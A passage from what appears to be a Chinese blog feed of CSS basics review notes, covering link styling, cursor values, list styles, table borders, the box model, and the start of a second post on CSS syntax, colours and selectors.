*/</span><br></code></pre></div></td></tr></table></figure><p>当设置为若干链路状态的样式，也有一些顺序规则：</p><blockquote><ol><li>a:hover 必须跟在 a:link 和 a:visited 后面</li><li>a:active 必须跟在 a:hover 后面</li></ol></blockquote><h3 id="2-1-文本修饰（text-decoration）"><a href="#2-1-文本修饰（text-decoration）" class="headerlink" title="2.1 文本修饰（text-decoration）"></a>2.1 文本修饰（text-decoration）</h3><p>text-decoration 属性主要用于删除链接中的下划线。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:link</span> &#123;<span class="hljs-attribute">text-decoration</span>:none;&#125;<br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:visited</span> &#123;<span class="hljs-attribute">text-decoration</span>:none;&#125;<br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span> &#123;<span class="hljs-attribute">text-decoration</span>:underline;&#125;<br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:active</span> &#123;<span class="hljs-attribute">text-decoration</span>:underline;&#125;<br></code></pre></div></td></tr></table></figure><h3 id="2-2-背景颜色（background-color）"><a href="#2-2-背景颜色（background-color）" class="headerlink" title="2.2 背景颜色（background-color）"></a>2.2 背景颜色（background-color）</h3><p>背景颜色属性指定链接背景色。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:link</span> &#123;<span class="hljs-attribute">background-color</span>:<span class="hljs-number">#B2FF99</span>;&#125;<br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:visited</span> &#123;<span class="hljs-attribute">background-color</span>:<span class="hljs-number">#FFFF85</span>;&#125;<br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span> &#123;<span class="hljs-attribute">background-color</span>:<span class="hljs-number">#FF704D</span>;&#125;<br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:active</span> &#123;<span class="hljs-attribute">background-color</span>:<span class="hljs-number">#FF704D</span>;&#125;<br></code></pre></div></td></tr></table></figure><h3 id="2-3-鼠标形状"><a href="#2-3-鼠标形状" class="headerlink" title="2.3 鼠标形状"></a>2.3 鼠标形状</h3><p>常用鼠标形状。</p><table><thead><tr><th align="center">属性值</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">default</td><td align="center">默认光标，箭头</td></tr><tr><td align="center">pointer</td><td align="center">超链接的指针，手型</td></tr><tr><td align="center">wait</td><td align="center">指示程序正在忙</td></tr><tr><td align="center">help</td><td align="center">指示可用的帮忙</td></tr><tr><td align="center">text</td><td align="center">指示文本</td></tr><tr><td align="center">crosshair</td><td align="center">鼠标呈现十字状</td></tr></tbody></table><h3 id="2-4-光标类型-形状（cursor）"><a href="#2-4-光标类型-形状（cursor）" class="headerlink" title="2.4 光标类型/形状（cursor）"></a>2.4 光标类型/形状（cursor）</h3><p>可能的值。</p><table><thead><tr><th align="center">值</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><em>url</em></td><td align="center">需使用的自定义光标的 URL。注释：请在此列表的末端始终定义一种普通的光标，以防没有由 URL 定义的可用光标。</td></tr><tr><td align="center">default</td><td align="center">默认光标（通常是一个箭头）</td></tr><tr><td align="center">auto</td><td align="center">默认。浏览器设置的光标。</td></tr><tr><td align="center">crosshair</td><td align="center">光标呈现为十字线。</td></tr><tr><td align="center">pointer</td><td align="center">光标呈现为指示链接的指针（一只手）</td></tr><tr><td align="center">move</td><td align="center">此光标指示某对象可被移动。</td></tr><tr><td align="center">e-resize</td><td align="center">此光标指示矩形框的边缘可被向右（东）移动。</td></tr><tr><td align="center">ne-resize</td><td align="center">此光标指示矩形框的边缘可被向上及向右移动（北/东）。</td></tr><tr><td align="center">nw-resize</td><td align="center">此光标指示矩形框的边缘可被向上及向左移动（北/西）。</td></tr><tr><td align="center">n-resize</td><td align="center">此光标指示矩形框的边缘可被向上（北）移动。</td></tr><tr><td align="center">se-resize</td><td align="center">此光标指示矩形框的边缘可被向下及向右移动（南/东）。</td></tr><tr><td align="center">sw-resize</td><td align="center">此光标指示矩形框的边缘可被向下及向左移动（南/西）。</td></tr><tr><td align="center">s-resize</td><td align="center">此光标指示矩形框的边缘可被向下移动（南）。</td></tr><tr><td align="center">w-resize</td><td align="center">此光标指示矩形框的边缘可被向左移动（西）。</td></tr><tr><td align="center">text</td><td align="center">此光标指示文本。</td></tr><tr><td align="center">wait</td><td align="center">此光标指示程序正忙（通常是一只表或沙漏）。</td></tr><tr><td align="center">help</td><td align="center">此光标指示可用的帮助（通常是一个问号或一个气球）。</td></tr></tbody></table><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>请把鼠标移动到单词上，可以看到鼠标指针发生变化：<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;cursor:auto&quot;</span>&gt;</span><br>Auto<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;cursor:crosshair&quot;</span>&gt;</span><br>Crosshair<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;cursor:default&quot;</span>&gt;</span><br>Default<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;cursor:pointer&quot;</span>&gt;</span><br>Pointer<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;cursor:move&quot;</span>&gt;</span><br>Move<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;cursor:e-resize&quot;</span>&gt;</span><br>e-resize<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;cursor:ne-resize&quot;</span>&gt;</span><br>ne-resize<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;cursor:nw-resize&quot;</span>&gt;</span><br>nw-resize<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;cursor:n-resize&quot;</span>&gt;</span><br>n-resize<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;cursor:se-resize&quot;</span>&gt;</span><br>se-resize<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;cursor:sw-resize&quot;</span>&gt;</span><br>sw-resize<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;cursor:s-resize&quot;</span>&gt;</span><br>s-resize<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;cursor:w-resize&quot;</span>&gt;</span><br>w-resize<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;cursor:text&quot;</span>&gt;</span><br>text<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;cursor:wait&quot;</span>&gt;</span><br>wait<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;cursor:help&quot;</span>&gt;</span><br>help<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="3-列表样式（ul）"><a href="#3-列表样式（ul）" class="headerlink" title="3.列表样式（ul）"></a>3.列表样式（ul）</h2><p>列表属性。</p><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">list-style</td><td align="center">简写属性。用于把所有用于列表的属性设置于一个声明中</td></tr><tr><td align="center">list-style-image</td><td align="center">将图象设置为列表项标志。</td></tr><tr><td align="center">list-style-position</td><td align="center">设置列表中列表项标志的位置。</td></tr><tr><td align="center">list-style-type</td><td align="center">设置列表项标志的类型。</td></tr></tbody></table><h3 id="3-1-不同列表项标记（list-style-type）"><a href="#3-1-不同列表项标记（list-style-type）" class="headerlink" title="3.1 不同列表项标记（list-style-type）"></a>3.1 不同列表项标记（list-style-type）</h3><p>list-style-type 属性指定列表项标记的类型是。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">ul</span><span class="hljs-selector-class">.a</span> &#123;<span class="hljs-attribute">list-style-type</span>: circle;&#125;<br><span class="hljs-selector-tag">ul</span><span class="hljs-selector-class">.b</span> &#123;<span class="hljs-attribute">list-style-type</span>: square;&#125;<br><br><span class="hljs-selector-tag">ol</span><span class="hljs-selector-class">.c</span> &#123;<span class="hljs-attribute">list-style-type</span>: upper-roman;&#125;<br><span class="hljs-selector-tag">ol</span><span class="hljs-selector-class">.d</span> &#123;<span class="hljs-attribute">list-style-type</span>: lower-alpha;&#125;<br></code></pre></div></td></tr></table></figure><p>list-style-type 属性的常见属性值：</p><blockquote><ol><li>none：不使用项目符号</li><li>disc：实心圆</li><li>circle：空心圆</li><li>square：实心方块</li><li>decimal：阿拉伯数字 </li><li>lower-alpha：小写英文字母 </li><li>upper-alpha：大写英文字母 </li><li>lower-roman：小写罗马数字 </li><li>upper-roman：大写罗马数字</li></ol></blockquote><h3 id="3-2-作为列表项标记的图像（list-style-image）"><a href="#3-2-作为列表项标记的图像（list-style-image）" class="headerlink" title="3.2 作为列表项标记的图像（list-style-image）"></a>3.2 作为列表项标记的图像（list-style-image）</h3><p>要指定列表项标记的图像，使用列表样式图像属性：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">ul</span>&#123;<br><span class="hljs-attribute">list-style-image</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">&#x27;sqpurple.gif&#x27;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="3-3-简写属性"><a href="#3-3-简写属性" class="headerlink" title="3.3 简写属性"></a>3.3 简写属性</h3><p>在单个属性中可以指定所有的列表属性。</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">ul</span>&#123;<br><span class="hljs-attribute">list-style</span>: square <span class="hljs-built_in">url</span>(<span class="hljs-string">&quot;sqpurple.gif&quot;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>使用缩写属性值的顺序是：</p><blockquote><ol><li>list-style-type</li><li>list-style-position (有关说明，请参见下面的CSS属性表)</li><li>list-style-image</li></ol></blockquote><h2 id="4-表格（table）"><a href="#4-表格（table）" class="headerlink" title="4.表格（table）"></a>4.表格（table）</h2><h3 id="4-1-表格边框（border）"><a href="#4-1-表格边框（border）" class="headerlink" title="4.1 表格边框（border）"></a>4.1 表格边框（border）</h3><p>指定 CSS 表格边框，使用 border 属性。</p><p>使用实例：指定一个表格的 th 和 td 元素的黑色边框：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">table</span>, <span class="hljs-selector-tag">th</span>, <span class="hljs-selector-tag">td</span><br>&#123; <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid black; &#125;<br></code></pre></div></td></tr></table></figure><p>在上面的例子中的表格有双边框。这是因为表和 th / td 元素有独立的边界。为了显示一个表的单个边框，使用 border-collapse属性。</p><h3 id="4-2-折叠边框（border-collapse）"><a href="#4-2-折叠边框（border-collapse）" class="headerlink" title="4.2 折叠边框（border-collapse）"></a>4.2 折叠边框（border-collapse）</h3><p>border-collapse 属性设置表格的边框是否被折叠成一个单一的边框或隔开：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">table</span><br>&#123; <span class="hljs-attribute">border-collapse</span>:collapse; &#125;<br><span class="hljs-selector-tag">table</span>,<span class="hljs-selector-tag">th</span>, <span class="hljs-selector-tag">td</span> &#123; <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid black; &#125;<br></code></pre></div></td></tr></table></figure><h3 id="4-3-表格宽、高（width、height）"><a href="#4-3-表格宽、高（width、height）" class="headerlink" title="4.3 表格宽、高（width、height）"></a>4.3 表格宽、高（width、height）</h3><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">table</span><br>&#123; <span class="hljs-attribute">width</span>:<span class="hljs-number">100%</span>; &#125;<br><span class="hljs-selector-tag">th</span> &#123; <span class="hljs-attribute">height</span>:<span class="hljs-number">50px</span>; &#125;<br></code></pre></div></td></tr></table></figure><h3 id="4-4-表格文字对齐（text-align）"><a href="#4-4-表格文字对齐（text-align）" class="headerlink" title="4.4 表格文字对齐（text-align）"></a>4.4 表格文字对齐（text-align）</h3><p>表格中的文本对齐和垂直对齐属性。text-align 属性设置水平对齐方式，像左，右，或中心：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">td</span><br>&#123; <span class="hljs-attribute">text-align</span><span class="hljs-selector-pseudo">:right</span>; &#125;<br><span class="hljs-comment">/*垂直对齐属性设置垂直对齐，比如顶部，底部或中间：*/</span><br><span class="hljs-selector-tag">td</span><br>&#123; <span class="hljs-attribute">height</span>:<span class="hljs-number">50px</span>; <span class="hljs-attribute">vertical-align</span>:bottom; &#125;<br></code></pre></div></td></tr></table></figure><h3 id="4-5-表格填充（padding）"><a href="#4-5-表格填充（padding）" class="headerlink" title="4.5 表格填充（padding）"></a>4.5 表格填充（padding）</h3><p>如果在表的内容中控制空格之间的边框，应使用 td 和 th 元素的填充属性：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">td</span><br>&#123; <span class="hljs-attribute">padding</span>:<span class="hljs-number">15px</span>; &#125;<br></code></pre></div></td></tr></table></figure><h3 id="4-6-表格颜色"><a href="#4-6-表格颜色" class="headerlink" title="4.6 表格颜色"></a>4.6 表格颜色</h3><p>指定边框的颜色，和 th 元素的文本和背景颜色：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">table</span>, <span class="hljs-selector-tag">td</span>, <span class="hljs-selector-tag">th</span><br>&#123; <span class="hljs-attribute">border</span>:<span class="hljs-number">1px</span> solid green; &#125;<br><span class="hljs-selector-tag">th</span><br>&#123; <span class="hljs-attribute">background-color</span>:green; <span class="hljs-attribute">color</span>:white; &#125;<br></code></pre></div></td></tr></table></figure><h2 id="5-盒子模型（Box-Model）"><a href="#5-盒子模型（Box-Model）" class="headerlink" title="5.盒子模型（Box Model）"></a>5.盒子模型（Box Model）</h2><p>所有 HTML 元素可以看作盒子，在 CSS 中，”box model “这一术语是用来设计和布局时使用。CSS 盒模型本质上是一个盒子，封装周围的 HTML 元素，它包括：边距，边框，填充，和实际内容。盒模型允许我们在其它元素和周围元素边框之间的空间放置元素。如图：</p><p><img src="https://img-blog.csdnimg.cn/20210513165336628.gif"></p><p>说明：</p><blockquote><ul><li>Margin（外边距） - 清除边框区域。Margin 没有背景颜色，它是完全透明</li><li>Border（边框） - 边框周围的填充和内容。边框是受到盒子的背景颜色影响</li><li>Padding（内边距） - 清除内容周围的区域。会受到框中填充的背景颜色影响</li><li>Content（内容） - 盒子的内容，显示文本和图像</li></ul></blockquote><p>在盒模型中，外边距可以是负值，而且在很多情况下都要使用负值的外边距。</p><h3 id="5-1-元素的宽度和高度"><a href="#5-1-元素的宽度和高度" class="headerlink" title="5.1 元素的宽度和高度"></a>5.1 元素的宽度和高度</h3><p>当您指定一个 CSS 元素的宽度和高度属性时，你只是设置内容区域的宽度和高度。要知道，完全大小的元素，你还必须添加填充，边框和边距。</p><p>使用实例：元素的总宽度为 300px</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-attribute">width</span>:<span class="hljs-number">250px</span>;        <br><span class="hljs-attribute">padding</span>:<span class="hljs-number">10px</span>;        <br><span class="hljs-attribute">border</span>:<span class="hljs-number">5px</span> solid gray;        <br><span class="hljs-attribute">margin</span>:<span class="hljs-number">10px</span>;<br></code></pre></div></td></tr></table></figure><p>这里，250px (宽)+ 20px (左 + 右填充)+ 10px (左 + 右边框)+ 20px (左 + 右边距)= 300px</p><p>使用实例：只有 250 像素的空间。设置总宽度为 250 像素的元素：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-attribute">width</span>:<span class="hljs-number">220px</span>;<br><span class="hljs-attribute">padding</span>:<span class="hljs-number">10px</span>;<br><span class="hljs-attribute">border</span>:<span class="hljs-number">5px</span> solid gray;<br><span class="hljs-attribute">margin</span>:<span class="hljs-number">0px</span>;<br></code></pre></div></td></tr></table></figure><p>最终元素的总宽度计算公式：<br>总元素的宽度=宽度+左填充+右填充+左边框+右边框+左边距+右边距</p><p>元素的总高度最终计算公式：<br>总元素的高度=高度+顶部填充+底部填充+上边框+下边框+上边距+下边距</p><hr>]]></content>
    
    
    <categories>
      
      <category>WEB前端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>WEB前端-CSS基础知识复习（一）</title>
    <link href="/2021/05/13/WEB%E5%89%8D%E7%AB%AF/WEB%E5%89%8D%E7%AB%AF-CSS%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2021/05/13/WEB%E5%89%8D%E7%AB%AF/WEB%E5%89%8D%E7%AB%AF-CSS%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>CSS 指层叠样式表（Cascading Style Sheets）。通过与 XHTML 结合，CSS 可以帮助我们实行表现与结构分离的开发模式。 通过使用 CSS 来提升工作效率！<br>外部样式表通常存储在 CSS 文件中，外部样式表可以极大提高工作效率。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-语法"><a href="#1-语法" class="headerlink" title="1.语法"></a>1.语法</h2><p>CSS 规则由两个主要的部分构成：选择器，以及一条或多条声明。<br>选择器通常是您需要改变样式的 HTML 元素。</p><p>每条声明由一个属性和一个值组成。</p><p>属性（property）是您希望设置的样式属性（style attribute）。每个属性有一个值。属性和值被冒号分开。<br>如图：</p><p><img src="https://img-blog.csdnimg.cn/20210512164059413.gif"></p><h3 id="1-1-实例"><a href="#1-1-实例" class="headerlink" title="1.1 实例"></a>1.1 实例</h3><p>CSS 声明总是以分号 ( ; ) 结束，声明组以大括号 ({ }) 括起来:</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">color</span>:red;<span class="hljs-attribute">text-align</span>:center;&#125;<br></code></pre></div></td></tr></table></figure><p>也可以每行只描述一个属性:</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span><br>&#123;<span class="hljs-attribute">color</span>:red;<br><span class="hljs-attribute">text-align</span>:center;&#125;<br></code></pre></div></td></tr></table></figure><h3 id="1-2-颜色值写法"><a href="#1-2-颜色值写法" class="headerlink" title="1.2 颜色值写法"></a>1.2 颜色值写法</h3><p>在描述颜色的时候，除了使用英文单词 red，我们还可以使用十六进制的颜色值 #ff0000。</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span> &#123; <span class="hljs-attribute">color</span>: <span class="hljs-number">#ff0000</span>; &#125;<br></code></pre></div></td></tr></table></figure><p>为了节约字节，可以使用 CSS 的缩写形式： </p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span> &#123; <span class="hljs-attribute">color</span>: <span class="hljs-number">#f00</span>; &#125;<br></code></pre></div></td></tr></table></figure><p>还可以通过两种方法使用 RGB 值：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span> &#123; <span class="hljs-attribute">color</span>: <span class="hljs-built_in">rgb</span>(<span class="hljs-number">255</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>); &#125; <br><span class="hljs-selector-tag">p</span> &#123; <span class="hljs-attribute">color</span>: <span class="hljs-built_in">rgb</span>(<span class="hljs-number">100%</span>,<span class="hljs-number">0%</span>,<span class="hljs-number">0%</span>); &#125;<br></code></pre></div></td></tr></table></figure><p><strong>注意：</strong>当使用 RGB 百分比时，即使当值为 0 时也要写百分比符号。但是在其他的情况下就不需要这么做了。比如说，当尺寸为 0 像素时，0 之后不需要使用 px 单位。</p><h3 id="1-3-注释"><a href="#1-3-注释" class="headerlink" title="1.3 注释"></a>1.3 注释</h3><p>CSS注释以 “/*“ 开始, 以 “*/“ 结束, 如:</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-comment">/*这是个注释*/</span>        <br><span class="hljs-selector-tag">p</span>        <br>&#123;       <br><span class="hljs-attribute">text-align</span>:center;       <br><span class="hljs-comment">/*这是另一个注释*/</span>     <br><span class="hljs-attribute">color</span>:black;     <br><span class="hljs-attribute">font-family</span>:arial;       <br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="2-选择器"><a href="#2-选择器" class="headerlink" title="2.选择器"></a>2.选择器</h2><p>若要在 HTML 元素中设置 CSS 样式，需要在元素中设置 “id” 和 “class” 选择器。</p><h3 id="2-1-id-选择器"><a href="#2-1-id-选择器" class="headerlink" title="2.1 id 选择器"></a>2.1 id 选择器</h3><p>id 选择器可以为标有特定 id 的 HTML 元素指定特定的样式。HTML 元素以 id 属性来设置 id 选择器,CSS 中 id 选择器以 # 来定义。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-comment">/* id = &quot;para1&quot; ,ID 属性不要以数字开头,且ID 属性只能在每个 HTML 文档中出现一次。*/</span><br><span class="hljs-selector-id">#para1</span>&#123;  <br><span class="hljs-attribute">text-align</span>:center;<br><span class="hljs-attribute">color</span>:red; <br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="2-2-class-类选择器"><a href="#2-2-class-类选择器" class="headerlink" title="2.2 class 类选择器"></a>2.2 class 类选择器</h3><p>class 选择器用于描述一组元素的样式，class 选择器有别于 id 选择器，class 可以在多个元素中使用。class 选择器在 HTML 中以 class 属性表示, 在 CSS 中，类选择器以一个点”.”号显示：</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td 